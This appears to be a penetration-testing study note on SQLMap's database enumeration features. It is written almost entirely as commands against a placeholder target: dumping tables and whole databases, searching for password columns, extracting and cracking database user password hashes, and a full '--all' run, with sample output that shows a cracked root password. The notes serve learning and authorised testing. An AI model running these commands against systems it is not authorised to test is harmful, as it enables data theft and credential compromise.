# Database Enumeration

Enumeration happens after SQLi is confirmed. Goal: extract everything useful from the database.

SQLMap handles this automatically using a built-in `queries.xml` file that stores the right SQL for each DBMS. It picks inband queries (UNION/error-based) when possible, and falls back to blind queries (row-by-row, bit-by-bit) when needed.

## Basic DB Info

Always start here to understand what you're working with.

```bash
sqlmap -u "http://target.com/?id=1" --banner --current-user --current-db --is-dba
```

|Flag|What it retrieves|
|---|---|
|`--banner`|DB version (e.g. MySQL 5.1.41)|
|`--current-user`|Current DB user (e.g. root@%)|
|`--current-db`|Current database name (e.g. testdb)|
|`--is-dba`|Whether the current user has admin rights|

> **Note:** DB `root` ≠ OS `root`. Root in DB context just means full DB privileges, not OS-level access.

## List Tables

```bash
sqlmap -u "http://target.com/?id=1" --tables -D testdb
```

Output:

```
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

## Dump a Table

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb
```

Dumps the full table to console and saves it as a CSV file at: `~/.local/share/sqlmap/output/<target>/dump/<db>/<table>.csv`

Change output format with:

```bash
--dump-format=HTML    # or SQLite
```

## Dump Specific Columns Only

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb -C name,surname
```

## Dump Specific Rows (by position)

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

Gets rows 2 and 3 only.

## Dump with WHERE Condition

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

Filters rows on the DB side before dumping.

## Dump Entire Database

```bash
# All tables in a specific DB
sqlmap -u "http://target.com/?id=1" --dump -D testdb

# Everything from all databases
sqlmap -u "http://target.com/?id=1" --dump-all

# Everything, but skip system DBs (recommended)
sqlmap -u "http://target.com/?id=1" --dump-all --exclude-sysdbs
```

`--exclude-sysdbs` skips `information_schema`, `mysql`, `performance_schema`, etc. — system tables you usually don't care about in a pentest.

## Other Useful Enumeration Flags

```bash
--hostname       # Server hostname
--passwords      # Password hashes for DB users
--privileges     # Privileges of DB users
--roles          # Roles of DB users
--dbs            # List all databases
```

# Advanced Database Enumeration

## Get Full DB Schema

Dumps the structure (columns + data types) of every table across all databases — useful for getting a full picture before deciding what to target.

```bash
sqlmap -u "http://target.com/?id=1" --schema
```

Output shows each database → table → columns with types.

## Search for Tables or Columns by Keyword

When the DB is large and you don't know where the juicy data is, use `--search` with LIKE matching.

**Search tables by name:**

```bash
sqlmap -u "http://target.com/?id=1" --search -T user
# finds: users, USER_PRIVILEGES, user, etc.
```

**Search columns by name:**

```bash
sqlmap -u "http://target.com/?id=1" --search -C pass
# finds: password columns across all DBs and tables
```

After results come in, SQLMap will ask if you want to dump the found tables — handy shortcut.

## Password Hashes – Dump & Crack

When you dump a table and SQLMap spots something that looks like a hash, it automatically offers to crack it.

```bash
sqlmap -u "http://target.com/?id=1" --dump -D master -T users
```

SQLMap will:

1. Detect hash format automatically (e.g. SHA1, MD5, MySQL hash)
2. Offer to save hashes to a file for external tools
3. Offer to crack with a built-in dictionary attack

Cracking details:

- Runs multi-process (uses all available CPU cores)
- Supports **31 hash types**
- Built-in wordlist: **1.4 million entries** (compiled from public password leaks)
- Good success rate on non-random passwords

## DB User Password Hashes (System-level)

Separate from app-level passwords — this targets the database's own user accounts (like MySQL's `mysql.user` table).

```bash
sqlmap -u "http://target.com/?id=1" --passwords --batch
```

SQLMap fetches password hashes for DB users (e.g. `root`, `debian-sys-maint`) and offers to crack them the same way.

Example result:

```
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

## Nuclear Option – Dump Everything

```bash
sqlmap -u "http://target.com/?id=1" --all --batch
```

Runs the entire enumeration process automatically — schema, tables, users, passwords, everything accessible. Will run for a long time. Output saved to files; you sift through manually afterward.
